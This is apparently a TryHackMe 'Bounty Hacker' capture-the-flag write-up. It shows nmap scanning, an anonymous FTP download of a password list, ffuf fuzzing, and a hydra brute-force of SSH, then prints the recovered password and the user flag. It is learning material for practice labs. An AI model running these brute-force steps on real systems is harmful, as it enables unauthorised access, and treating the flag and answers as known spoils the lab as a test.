<p>Lab: <a href="https://tryhackme.com/room/cowboyhacker">Bounty Hacker</a></p>
<p>Tools: </p>
<ul>
<li><strong>nmap</strong>:  tool to find open ports, detect operating systems and discover potential vulnerabilities </li>
<li><strong>ftp</strong>: command-line tool that allows users to transfer files to or from a remote server using the FTP protocol.</li>
<li><strong>gowitness</strong>: command line tool written in Go to capture and screenshot web pages</li>
<li><strong>ffuf</strong>: web fuzzer written in Go to discover hidden or unlinked resources on a web server </li>
<li><strong>hydra</strong>: online password-cracking tool for ftp, ssh, http and telnet services</li>
</ul>
<p>After connecting to the network through TryHackMe&#39;s VPN. I want to make sure the target is reachable.</p>
<pre><code>ping -c <span class="hljs-number">5</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>  
PING <span class="hljs-number">10.10</span><span class="hljs-number">.137</span><span class="hljs-number">.182</span> (<span class="hljs-number">10.10</span><span class="hljs-number">.137</span><span class="hljs-number">.182</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> data.
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">202</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>: icmp_seq=<span class="hljs-number">2</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">190</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>: icmp_seq=<span class="hljs-number">3</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">186</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>: icmp_seq=<span class="hljs-number">4</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">222</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>: icmp_seq=<span class="hljs-number">5</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">190</span> ms

<span class="hljs-comment">--- 10.10.74.157 ping statistics ---</span>
<span class="hljs-number">5</span> packets transmitted, <span class="hljs-number">5</span> received, <span class="hljs-number">0</span>% packet loss, <span class="hljs-built_in">time</span> <span class="hljs-number">4011</span>ms
rtt <span class="hljs-built_in">min</span>/<span class="hljs-built_in">avg</span>/<span class="hljs-built_in">max</span>/mdev = <span class="hljs-number">185.976</span>/<span class="hljs-number">198.154</span>/<span class="hljs-number">222.401</span>/<span class="hljs-number">13.315</span> ms
</code></pre><hr>
<p><strong>Host Enumeration</strong>
After confirming that  I can reach the target. I run an nmap scan.</p>
<table>
<thead>
<tr>
<th>Nmap Flags</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>T5</td>
<td>Fastest scanning speed</td>
</tr>
<tr>
<td>SC</td>
<td>Runs default scripts</td>
</tr>
<tr>
<td>sV</td>
<td>Version detection on open ports</td>
</tr>
</tbody>
</table>
<pre><code><span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-T5</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.74</span><span class="hljs-selector-class">.157</span>
<span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-class">.94SVN</span> ( [https]:<span class="hljs-comment">//nmap.org ) at 2024-01-25 11:16 EST</span>
Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">137.182</span>
Host is up (<span class="hljs-number">0.20s</span> latency).
Not <span class="hljs-attribute">shown</span>: <span class="hljs-number">967</span> filtered tcp ports (no-response), <span class="hljs-number">30</span> closed tcp ports (reset)
PORT   STATE SERVICE VERSION
**<span class="hljs-number">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span>**
| <span class="hljs-attribute">ftp-syst</span>: 
|   <span class="hljs-attribute">STAT</span>: 
| FTP server <span class="hljs-attribute">status</span>:
|      Connected <span class="hljs-attribute">to </span>::<span class="hljs-attribute">ffff</span>:<span class="hljs-number">10.13</span>.<span class="hljs-number">0.39</span>
|      Logged in as ftp
|      <span class="hljs-attribute">TYPE</span>: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span class="hljs-number">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span class="hljs-number">2</span>
|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable
|_End of status
**| <span class="hljs-attribute">ftp-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)**
|_Can't get directory <span class="hljs-attribute">listing</span>: TIMEOUT
**<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">8</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)**
| <span class="hljs-attribute">ssh-hostkey</span>: 
|   <span class="hljs-number">2048</span> <span class="hljs-attribute">dc</span>:<span class="hljs-attribute">f8</span>:<span class="hljs-attribute">df</span>:<span class="hljs-attribute">a7</span>:<span class="hljs-attribute">a6</span>:<span class="hljs-number">00</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<span class="hljs-number">18</span>:<span class="hljs-attribute">b0</span>:<span class="hljs-number">70</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">a5</span>:<span class="hljs-attribute">aa</span>:<span class="hljs-attribute">a6</span>:<span class="hljs-number">14</span>:<span class="hljs-number">3</span>e (RSA)
|   <span class="hljs-number">256</span> <span class="hljs-attribute">ec</span>:<span class="hljs-attribute">c0</span>:<span class="hljs-attribute">f2</span>:<span class="hljs-attribute">d9</span>:<span class="hljs-number">1</span><span class="hljs-attribute">e</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">48</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">38</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">e3</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-number">08</span>:<span class="hljs-attribute">c4</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:c9 (ECDSA)
|_  <span class="hljs-number">256</span> <span class="hljs-attribute">a4</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">15</span>:<span class="hljs-attribute">a5</span>:<span class="hljs-attribute">d4</span>:<span class="hljs-attribute">b1</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">16</span>:<span class="hljs-number">50</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">d0</span>:<span class="hljs-attribute">d8</span>:<span class="hljs-number">13</span>:c2 (ED25519)
**<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))**
|<span class="hljs-attribute">_http-title</span>: Site doesn't have a title (text/html).
|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)
Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OSs</span>: Unix, Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel

Service detection performed. Please report any incorrect results at [https]:<span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">48.24</span> seconds
</code></pre><hr>
<p><strong>FTP - Anonymous Login (Port  21)</strong>
Anonymous login is enabled </p>
<pre><code><span class="hljs-keyword">ftp</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> <span class="hljs-number">21</span> 
Connected <span class="hljs-built_in">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>.
<span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span>)
Name (<span class="hljs-number">10.10</span><span class="hljs-number">.137</span><span class="hljs-number">.182</span>:root): anonymous
<span class="hljs-number">230</span> Login successful.
Remote <span class="hljs-keyword">system</span> type is UNIX.
Using binary mode <span class="hljs-built_in">to</span> transfer <span class="hljs-built_in">files</span>.
<span class="hljs-keyword">ftp</span>&gt; passive
Passive mode: off; fallback <span class="hljs-built_in">to</span> active mode: off.
<span class="hljs-keyword">ftp</span>&gt; prompt
Interactive mode off.
<span class="hljs-keyword">ftp</span>&gt; ls -alt
<span class="hljs-number">200</span> EPRT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">EPSV</span>.
<span class="hljs-number">150</span> Here comes <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> listing.
drwxr-xr-x    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Jun <span class="hljs-number">07</span>  <span class="hljs-number">2020</span> ..
drwxr-xr-x    <span class="hljs-number">2</span> <span class="hljs-keyword">ftp</span>      <span class="hljs-keyword">ftp</span>          <span class="hljs-number">4096</span> Jun <span class="hljs-number">07</span>  <span class="hljs-number">2020</span> .
-rw-rw-r<span class="hljs-comment">--    1 ftp      ftp            68 Jun 07  2020 task.txt</span>
-rw-rw-r<span class="hljs-comment">--    1 ftp      ftp           418 Jun 07  2020 locks.txt</span>
<span class="hljs-number">226</span> Directory <span class="hljs-built_in">send</span> OK.
<span class="hljs-keyword">ftp</span>&gt; mget *
<span class="hljs-built_in">local</span>: locks.txt remote: locks.txt
<span class="hljs-number">200</span> EPRT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">EPSV</span>.
<span class="hljs-number">150</span> Opening BINARY mode data connection <span class="hljs-keyword">for</span> locks.txt (<span class="hljs-number">418</span> <span class="hljs-keyword">bytes</span>).
<span class="hljs-number">100</span>% |***********************************************************************************|   <span class="hljs-number">418</span>        <span class="hljs-number">4.24</span> MiB/s    <span class="hljs-number">00</span>:<span class="hljs-number">00</span> ETA
<span class="hljs-number">226</span> Transfer complete.
<span class="hljs-number">418</span> <span class="hljs-keyword">bytes</span> received <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-number">2.18</span> KiB/s)
<span class="hljs-built_in">local</span>: task.txt remote: task.txt
<span class="hljs-number">200</span> EPRT <span class="hljs-keyword">command</span> <span class="hljs-title">successful</span>. <span class="hljs-title">Consider</span> <span class="hljs-title">using</span> <span class="hljs-title">EPSV</span>.
<span class="hljs-number">150</span> Opening BINARY mode data connection <span class="hljs-keyword">for</span> task.txt (<span class="hljs-number">68</span> <span class="hljs-keyword">bytes</span>).
<span class="hljs-number">100</span>% |***********************************************************************************|    <span class="hljs-number">68</span>       <span class="hljs-number">12.69</span> KiB/s    <span class="hljs-number">00</span>:<span class="hljs-number">00</span> ETA
<span class="hljs-number">226</span> Transfer complete.
<span class="hljs-number">68</span> <span class="hljs-keyword">bytes</span> received <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-number">0.33</span> KiB/s)
</code></pre><p>Contents of files from FTP directories</p>
<p><strong>task.txt</strong></p>
<pre><code>cat task.txt 
<span class="hljs-number">1.</span>) Protect Vicious.
<span class="hljs-number">2.</span>) Plan <span class="hljs-keyword">for</span> Red Eye pickup <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> moon.

-lin
</code></pre><p><strong>locks.txt</strong></p>
<pre><code>cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr<span class="hljs-symbol">@gOn</span>$yn9icat3
R3DDr46ONSYndIC<span class="hljs-symbol">@Te</span>
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c<span class="hljs-symbol">@T3</span>
Synd1c4teDr<span class="hljs-symbol">@g0n</span>
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC<span class="hljs-symbol">@t3</span>
<span class="hljs-number">4</span>L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr<span class="hljs-symbol">@gOn</span>$yND1C4Te
RedDr<span class="hljs-symbol">@gonSyn9ic47e</span>
REd$yNdIc47e
dr<span class="hljs-symbol">@goN5YNd1c</span><span class="hljs-symbol">@73</span>
rEDdrAGOnSyNDiCat3
r3ddr<span class="hljs-symbol">@g0N</span>
ReDSynd1ca7e
</code></pre><p>The user lin created a task list. Locks.txt is possibly a list of passwords that can be used to gain access through the ssh</p>
<hr>
<p><strong>Website Enumeration (Port 80)</strong></p>
<p>At the index of the web server on port 80, the following message can be viewed
<img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/53225ff3-6e2b-4b48-a7be-9ddc506a1a5e" alt="http-10 10 137 182-"></p>
<pre><code>ffuf -w directory-list<span class="hljs-number">-2.3</span>-medium.<span class="hljs-string">txt:</span>FUZZ -u <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.74.157/FUZZ</span>

        <span class="hljs-regexp">/'___\  /</span><span class="hljs-string">'___\           /'</span>___\       
       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       
       \ \ ,__\\ \ ,__\<span class="hljs-regexp">/\ \/\ \ \ \ </span>,__\      
        \ \ \_<span class="hljs-regexp">/ \ \ \_/\ \ \_\ \ \ \ \_</span>/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \<span class="hljs-regexp">/_/</span>    \<span class="hljs-regexp">/_/</span>   \<span class="hljs-regexp">/___/</span>    \<span class="hljs-regexp">/_/</span>       

       v2<span class="hljs-number">.1</span><span class="hljs-number">.0</span>-dev
________________________________________________

 :: <span class="hljs-string">Method           :</span> GET
 :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//10.10.74.157/FUZZ</span>
 :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list<span class="hljs-number">-2.3</span>-medium.txt
 :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
 :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
 :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
 :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span><span class="hljs-number">-299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span>
________________________________________________

images                  [<span class="hljs-string">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">315</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">208</span>ms]
                        [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">969</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">135</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">31</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">187</span>ms]
server-status           [<span class="hljs-string">Status:</span> <span class="hljs-number">403</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">278</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">20</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">10</span>, <span class="hljs-string">Duration:</span> <span class="hljs-number">186</span>ms]
:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">220546</span><span class="hljs-regexp">/220546] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">203</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">18</span>:<span class="hljs-number">28</span>] :: <span class="hljs-string">Errors:</span> <span class="hljs-number">0</span> ::
</code></pre><p>There isn&#39;t anything else to enumerate on port 80 other than the images directory.
<img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/4f21e002-a675-4101-a9e1-febf1d822167" alt="http-10 10 74 157-images-"></p>
<hr>
<p><strong>SSH (Port 22)</strong></p>
<pre><code>hydra -l lin -P locks.txt ssh://10.10.74.157 -V                                 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) <span class="hljs-keyword">starting</span> <span class="hljs-keyword">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-25</span> <span class="hljs-number">13</span>:<span class="hljs-number">22</span>:<span class="hljs-number">17</span>
[<span class="hljs-keyword">WARNING</span>] Many SSH configurations <span class="hljs-keyword">limit</span> the <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">parallel</span> tasks, it <span class="hljs-keyword">is</span> recommended <span class="hljs-keyword">to</span> reduce the tasks: <span class="hljs-keyword">use</span> -t <span class="hljs-number">4</span>
[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">26</span> login tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">26</span>), ~<span class="hljs-number">2</span> tries per task
[<span class="hljs-keyword">DATA</span>] attacking ssh://<span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>:<span class="hljs-number">22</span>/
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"rEddrAGON"</span> - <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">0</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"ReDdr4g0nSynd!cat3"</span> - <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">1</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"Dr@gOn$yn9icat3"</span> - <span class="hljs-number">3</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">2</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"R3DDr46ONSYndIC@Te"</span> - <span class="hljs-number">4</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">3</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"ReddRA60N"</span> - <span class="hljs-number">5</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">4</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"R3dDrag0nSynd1c4te"</span> - <span class="hljs-number">6</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">5</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"dRa6oN5YNDiCATE"</span> - <span class="hljs-number">7</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">6</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"ReDDR4g0n5ynDIc4te"</span> - <span class="hljs-number">8</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">7</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"R3Dr4gOn2044"</span> - <span class="hljs-number">9</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">8</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"RedDr4gonSynd1cat3"</span> - <span class="hljs-number">10</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">9</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"R3dDRaG0Nsynd1c@T3"</span> - <span class="hljs-number">11</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">10</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"Synd1c4teDr@g0n"</span> - <span class="hljs-number">12</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">11</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"reddRAg0N"</span> - <span class="hljs-number">13</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">12</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"REddRaG0N5yNdIc47e"</span> - <span class="hljs-number">14</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">13</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"Dra6oN$yndIC@t3"</span> - <span class="hljs-number">15</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">14</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[ATTEMPT] target <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span> - login <span class="hljs-string">"lin"</span> - pass <span class="hljs-string">"4L1mi6H71StHeB357"</span> - <span class="hljs-number">16</span> <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> [<span class="hljs-keyword">child</span> <span class="hljs-number">15</span>] (<span class="hljs-number">0</span>/<span class="hljs-number">0</span>)
[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">10.10</span><span class="hljs-number">.74</span><span class="hljs-number">.157</span>   login: lin   <span class="hljs-keyword">password</span>: RedDr4gonSynd1cat3
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid <span class="hljs-keyword">password</span> <span class="hljs-keyword">found</span>
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished <span class="hljs-keyword">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-25</span> <span class="hljs-number">13</span>:<span class="hljs-number">22</span>:<span class="hljs-number">23</span>
</code></pre><pre><code>The valid ssh credentials <span class="hljs-string">are:</span>
<span class="hljs-string">username:</span> lin
<span class="hljs-string">password:</span> RedDr4gonSynd1cat3
</code></pre><p>After establishing an SSH connection to the web server, I then checked the contents of the Desktop directory and read the user flag.</p>
<pre><code>ssh lin@<span class="hljs-number">10.10</span>.<span class="hljs-number">74.157</span>         
The authenticity <span class="hljs-keyword">of</span> host '<span class="hljs-number">10.10</span>.<span class="hljs-number">74.157</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">74.157</span>)' can<span class="hljs-symbol">'t</span> be established.
ED25519 key fingerprint <span class="hljs-keyword">is</span> SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> known by any other names.
Are you sure you want <span class="hljs-keyword">to</span> continue connecting (yes/no/[fingerprint])? yes
<span class="hljs-literal">Warning</span>: Permanently added '<span class="hljs-number">10.10</span>.<span class="hljs-number">74.157</span>' (ED25519) <span class="hljs-keyword">to</span> the list <span class="hljs-keyword">of</span> known hosts.
lin@<span class="hljs-number">10.10</span>.<span class="hljs-number">74.157</span><span class="hljs-symbol">'s</span> password: 
Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">16.04</span>.<span class="hljs-number">6</span> LTS (GNU/Linux <span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">101</span>-<span class="hljs-keyword">generic</span> x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span class="hljs-number">83</span> packages can be updated.
<span class="hljs-number">0</span> updates are security updates.

Last login: Sun Jun  <span class="hljs-number">7</span> <span class="hljs-number">22</span>:<span class="hljs-number">23</span>:<span class="hljs-number">41</span> <span class="hljs-number">2020</span> from <span class="hljs-number">192.168</span>.<span class="hljs-number">0.14</span>
lin@bountyhacker:~/Desktop$
</code></pre><pre><code>lin@bountyhacker:~/Desktop$ ls -alt
total 12
drwxr-xr-x<span class="hljs-number"> 19 </span>lin lin<span class="hljs-number"> 4096 </span>Jun <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>..
-rw-rw-r-- <span class="hljs-number"> 1 </span>lin lin  <span class="hljs-number"> 21 </span>Jun <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>user.txt
drwxr-xr-x <span class="hljs-number"> 2 </span>lin lin<span class="hljs-number"> 4096 </span>Jun <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>.
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
